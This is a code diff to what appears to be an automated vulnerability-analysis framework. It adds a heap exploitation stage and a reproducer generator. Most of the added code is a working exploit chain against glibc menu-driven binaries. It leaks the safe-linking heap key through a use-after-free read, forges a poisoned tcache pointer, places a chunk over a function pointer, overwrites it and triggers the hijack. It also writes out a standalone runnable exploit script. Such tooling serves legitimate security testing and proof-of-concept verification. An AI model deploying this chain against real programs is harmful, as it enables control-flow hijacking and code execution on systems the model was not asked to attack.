@@ -252,6 +252,16 @@ def chain_primitive_stage(ctx) -> dict:
                                            f"{hex(chunk + 8)}), option {show_o}'s virtual call "
                                            f"dispatches to &{win_name}"),
                                     writer=edit_o, off=None, trig=show_o, exe=exe)
+                # Leak-consuming safe-linked tcache poison FIRST: recover the heap key from an
+                # in-band UAF leak and forge the fd at runtime, so the PoC survives heap ASLR on the
+                # live target (the traced-address _tcache_chain below is only valid ASLR-off). Tried
+                # first because it is the one that generalises off the sandbox.
+                hl = _heap_leak_chain(ctx, exe, win, opts, model, width, workdir, glibc=_glibc)
+                if hl:
+                    roles, trig, tgt, key = hl
+                    return _file_heap_leak_l3(ctx, target, lead, vclass, win_name, win_addr,
+                                              roles, trig, tgt, key,
+                                              _glibc is None or tuple(_glibc) >= (2, 32))
                 # tcache-poison: free -> UAF-overwrite fd -> alloc a chunk over a code ptr
                 tc = _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts,
                                    model, width, workdir, capture, glibc=_glibc)
@@ -446,6 +456,126 @@ def _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir):
                     ctx.progress(msg=f"PIE hijack: leak {leak_opt} -> base -> option {writer} "
                                      f"writes base+{win_vaddr:#x} at +{off} -> {win_name} ran")
                     return leak_opt, writer, off, trig, base
+    return None
+
+
+def _heap_leak_run(spawn, width, roles, trig, target, win_addr, model, *, safe, corrupt):
+    """One in-process safe-linking tcache-poison run -- ASLR-robust, because the leak and every
+    write happen in the SAME live process so the key is the running one (not a traced constant, the
+    limit of `_tcache_chain`).
+
+    Free a fresh chunk, READ the heap key its use-after-free view discloses (a lone freed tcache
+    chunk's fd == addr>>12 under safe-linking), forge fd := key ^ target so the next-but-one malloc
+    lands a chunk ON `target`, write `win_addr` there and trigger the call through it. `corrupt`
+    forges a deliberately-wrong fd for the negative control. Returns (key, trigger_output); key is
+    None when the view disclosed nothing recoverable. Never raises."""
+    from ..fuzz import menu
+    from . import heap_groom
+    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
+    proc = spawn()
+    try:
+        _pie_drain(proc)
+
+        def send(b):
+            proc.stdin.write(b)
+            proc.stdin.flush()
+
+        def op(opt, **kw):
+            send(menu._scalar(opt.encode(), width) + menu._fill(model.get(opt, []), width=width, **kw))
+            return _pie_drain(proc)[0]
+
+        def idx_op(opt, idx):
+            send(menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width))
+            return _pie_drain(proc)[0]
+
+        def edit_at(idx, payload):
+            # idx, [length,] then the raw fd/word with NO terminator -- an exact-length read()
+            # would otherwise leave a stray newline in the pipe and desync the next op.
+            out = menu._scalar(edit.encode(), width) + menu._scalar(str(idx).encode(), width)
+            if "num" in model.get(edit, []):
+                out += menu._scalar(str(len(payload)).encode(), width)
+            send(out + menu._data(payload, width, term=False))
+
+        # Free TWO same-size chunks so the bin count stays > 0 across both reclaiming mallocs
+        # (glibc gates tcache_get on counts[idx] > 0, so a single free lets only ONE malloc be
+        # redirected -- never reaching the forged target). Bin becomes [B, A] (LIFO): A (freed
+        # first) is the tail with a CLEAN fd == addr>>12, B (freed second) is the head we poison.
+        op(add, num=b"24")                               # chunk 0 -- A (leak source, the tail)
+        op(add, num=b"24")                               # chunk 1 -- B (the head we poison)
+        idx_op(free, 0)                                  # free A -> A.fd == mangle(A, NULL) == A>>12
+        idx_op(free, 1)                                  # free B -> bin [B, A], count 2
+        leak = idx_op(view, 0)                            # UAF view of the TAIL A -> the clean key
+        cands = [int(x, 16) for x in re.findall(rb"0x([0-9a-fA-F]{5,12})", leak)]
+        raw = leak if isinstance(leak, bytes) else leak.encode("latin1")
+        cands += [int.from_bytes(raw[i:i + 8], "little") for i in range(0, max(0, len(raw) - 7))]
+        key = next((v for v in cands if heap_groom.is_plausible_heap_key(v)), None)
+        if key is None:
+            return None, b""
+        # B sits one chunk from A, so B>>12 == A>>12 == key except across a page boundary -- and a
+        # wrong key just fails the oracle, never a false confirm.
+        mangled = heap_groom.forge_safelink_fd(key, target) if safe else target
+        if corrupt:
+            mangled ^= 0xDEAD0000                        # a wrong fd -> malloc misses target
+        edit_at(1, _p64(mangled))                        # UAF write the poisoned fd into the HEAD B
+        _pie_drain(proc)
+        op(add, num=b"24")                               # chunk 2 -- reclaims B (count -> 1)
+        op(add, num=b"24")                               # chunk 3 -- lands ON target (count -> 0)
+        _pie_drain(proc)
+        edit_at(3, _p64(win_addr))                        # write win over the code pointer at target
+        _pie_drain(proc)
+        tout = b""
+        if trig is not None:
+            send(menu._scalar(trig.encode(), width) + menu._scalar(b"3", width))
+            tout = _pie_drain(proc)[0]
+        return key, (tout if isinstance(tout, bytes) else tout.encode("latin1"))
+    except (BrokenPipeError, OSError):
+        return None, b""
+    finally:
+        from ..dynamic import sandbox as _sb
+        _sb.kill_quietly(proc)
+
+
+def _heap_leak_chain(ctx, exe, win, opts, model, width, workdir, *, glibc=None):
+    """Leak-consuming safe-linked tcache poison -> control hijack: find the add/free/view/edit roles,
+    then for each writable fn-pointer target recover the heap key from an in-band UAF leak and forge
+    a chunk over the target IN ONE PROCESS, confirming the win RUNS (its banner / shell appears) with
+    a negative control (a corrupted fd must NOT win). Marker-confirmed, not ptrace: the leak and the
+    poison must share one process to defeat real heap ASLR, so no static payload can carry it. The
+    ASLR-robust complement to `_tcache_chain` (which bakes in a traced, ASLR-off address). Returns
+    (roles, trig, target, key) or None.
+
+    Requires a use-after-free VIEW that discloses the freed chunk's fd (the safe-linking leak) and a
+    use-after-free EDIT that overwrites it -- the standard poison shape. Best-effort; bounded."""
+    from ..dynamic import heap_discover
+    win_name, win_addr = win
+    safe = glibc is None or (isinstance(glibc, tuple) and tuple(glibc) >= (2, 32))
+    roles = heap_discover.identify_heap_ops(workdir, exe, model, opts, width)
+    if not roles or not roles.get("edit"):               # need the UAF write that plants the fd
+        return None
+    targets = _writable_globals(exe)
+    if not targets:
+        return None
+    spawn = _pie_spawn(workdir, exe)
+    attempts = 0
+    for tgt in targets:
+        for trig in list(opts) + [None]:
+            if ctx.should_cancel() or attempts >= 200:
+                return None
+            attempts += 1
+            key, pos = _heap_leak_run(spawn, width, roles, trig, tgt, win_addr, model,
+                                      safe=safe, corrupt=False)
+            if key is None:
+                continue
+            pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
+            if not any(_WIN_OUT.search(ln) for ln in pos_lines):
+                continue
+            _, neg = _heap_leak_run(spawn, width, roles, trig, tgt, win_addr, model,
+                                    safe=safe, corrupt=True)
+            neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
+            if [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]:
+                ctx.progress(msg=(f"safe-linked tcache poison: leak {roles['view']} -> heap key, "
+                                  f"fd := key^{tgt:#x}, chunk over {tgt:#x} := &{win_name} -> ran"))
+                return roles, trig, tgt, key
     return None
 
 
@@ -1141,6 +1271,112 @@ def _file_pie_l3(ctx, target, lead, vclass, win_name, *, win_vaddr, leak_opt, wr
     ctx.progress(pct=100, msg=f"L3 CONFIRMED (PIE): leak {leak_opt} -> base -> {win_name}")
     return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
             "metrics": {"chained": True, "level": "L3", "vclass": vclass, "pie": True, "off": off}}
+
+
+def _heap_leak_repro_script(win_addr, roles, trig, target, safe) -> bytes:
+    """A stdlib-only reproducer for the leak-consuming safe-linked tcache poison: alloc+free+view to
+    read the live heap key, forge fd := key^target, alloc twice to land a chunk on target, write win
+    there and trigger. Carries NO baked address but win's file vaddr (non-PIE) and `target`; the key
+    is recovered from the target's own leak at run time, so the exploit survives heap ASLR."""
+    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
+    tg = "" if trig is None else f"send({trig!r}+'\\n'); send('3\\n')\n"
+    editnum = "num" in (roles.get("edit_fields") or [])
+    return (
+        "#!/usr/bin/env python3\n"
+        "# Safe-linked tcache-poison reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
+        "import subprocess, select, os, re, struct, sys, time\n"
+        f"WIN={win_addr:#x}; TARGET={target:#x}; SAFE={bool(safe)}; EDITNUM={bool(editnum)}\n"
+        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
+        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
+        "def drain(t=0.4):\n"
+        "  b=b''; end=time.time()+t\n"
+        "  while time.time()<end:\n"
+        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
+        "    if r:\n"
+        "      c=os.read(p.stdout.fileno(),4096)\n"
+        "      if not c: break\n"
+        "      b+=c\n"
+        "    elif p.poll() is not None: break\n"
+        "  return b\n"
+        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
+        "def edit(idx,payload):\n"
+        f"  send({edit!r}+'\\n'); send(str(idx)+'\\n')\n"
+        "  if EDITNUM: send(str(len(payload))+'\\n')\n"
+        "  send(payload); drain()\n"
+        "drain()\n"
+        # Free TWO same-size chunks (count stays >0 across both reclaiming mallocs); bin is [B,A]
+        # LIFO, A the clean-fd tail we leak, B the head we poison.
+        f"send({add!r}+'\\n'); send('24\\n'); drain()\n"               # chunk 0 -- A
+        f"send({add!r}+'\\n'); send('24\\n'); drain()\n"               # chunk 1 -- B
+        f"send({free!r}+'\\n'); send('0\\n'); drain()\n"               # free A -> A.fd == A>>12
+        f"send({free!r}+'\\n'); send('1\\n'); drain()\n"               # free B -> bin [B,A]
+        f"send({view!r}+'\\n'); out=send('0\\n') or drain()\n"         # UAF view of tail A -> key
+        "cands=[int(x,16) for x in re.findall(rb'0x([0-9a-fA-F]{5,12})',out)]\n"
+        "cands+=[int.from_bytes(out[i:i+8],'little') for i in range(0,max(0,len(out)-7))]\n"
+        "key=next((v for v in cands if 0x100<=v<(1<<36)), None)\n"
+        "assert key is not None, 'no heap key disclosed by the UAF view'\n"
+        "fd=(key^TARGET) if SAFE else TARGET\n"
+        "edit(1, struct.pack('<Q',fd))\n"                              # poison the HEAD B's fd
+        f"send({add!r}+'\\n'); send('24\\n'); drain()\n"               # chunk 2 -- reclaims B
+        f"send({add!r}+'\\n'); send('24\\n'); drain()\n"               # chunk 3 -- ON target
+        "edit(3, struct.pack('<Q',WIN))\n"                             # win over the code pointer
+        f"{tg}"
+        "sys.stdout.write(drain().decode('latin-1','ignore'))\n"
+    ).encode()
+
+
+def _file_heap_leak_l3(ctx, target, lead, vclass, win_name, win_addr, roles, trig, tgt, key, safe):
+    """File a confirmed leak-consuming safe-linked tcache poison as an L3 verified PoC (bundle =
+    target + a runnable leak-then-poison reproducer -- no static input can carry a runtime-leaked
+    key)."""
+    import json as _json
+
+    from ...db.dao import FindingDAO, PocDAO
+    from . import bundle
+    script = _heap_leak_repro_script(win_addr, roles, trig, tgt, safe)
+    input_sha = ctx.put_artifact("heap-leak-chain-repro", data=script)
+    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
+            "exploit": f"{vclass}->control-flow (safe-linked tcache poison, leak-relocated)",
+            "target": win_name, "win_addr": hex(win_addr), "fnptr_target": hex(tgt),
+            "leak_option": roles["view"], "tool_version": TOOL_VERSION}
+    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
+                        "stdin", [], None,
+                        primitive={"type": vclass, "target": win_name, "fnptr_target": hex(tgt),
+                                   "confirmed": True, "note": "safe-linked tcache poison, leak-relocated"})
+    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
+    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
+                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
+    trg = "normal use" if trig is None else f"menu option {trig}"
+    sl = "safe-linked (glibc>=2.32)" if safe else "unmangled (pre-2.32)"
+    eff = (f"working heap exploit ({vclass} -> control-flow hijack via {sl} tcache poisoning): "
+           f"option {roles['view']}'s use-after-free view disclosed the freed chunk's fd -- the "
+           f"heap key addr>>12 -- so the fd was forged to key^{tgt:#x}, two allocations landed a "
+           f"chunk on the code pointer at {tgt:#x}, option {roles['edit']} wrote &{win_name} there, "
+           f"and {trg} called it. Shown in ONE process (a real heap-ASLR defeat -- the key is the "
+           f"live one, not a traced constant) and confirmed by the win's output under a passing "
+           f"negative control (a corrupted fd does not win).")
+    fd = FindingDAO(ctx.conn)
+    cand = {"cwe": lead.cwe,
+            "title": "Control-flow hijack (demonstrated): L3 safe-linked tcache poison (leak-relocated)",
+            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
+            "confidence": 0.99, "authoritative": True, "title_only": True,
+            "dedup_key": f"chain:{vclass}:heap-leak:{target.id}", "site_detail": win_name,
+            "evidence": [{"channel": "effects", "detail": _json.dumps([{
+                "kind": "rce", "title": "Control-flow hijack (safe-linked tcache poison, ASLR defeated)",
+                "status": "demonstrated", "detail": eff,
+                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
+                          "note": eff}}])}]}
+    fd.upsert(target.id, target.case_id, cand)
+    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
+    if fid:
+        PocDAO(ctx.conn).set_finding(poc_id, fid)
+    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
+    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
+             "win": win_name, "leak": roles["view"], "edit": roles["edit"], "fnptr_target": hex(tgt),
+             "trigger": trig, "safe_linking": safe, "bundle": bundle_sha})
+    ctx.progress(pct=100, msg=f"L3 CONFIRMED (heap): safe-linked tcache poison -> {win_name}")
+    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
+            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "heap_leak": True}}
 
 
 def _stage_and_crawl(ctx, target, *, exe_dir=None):
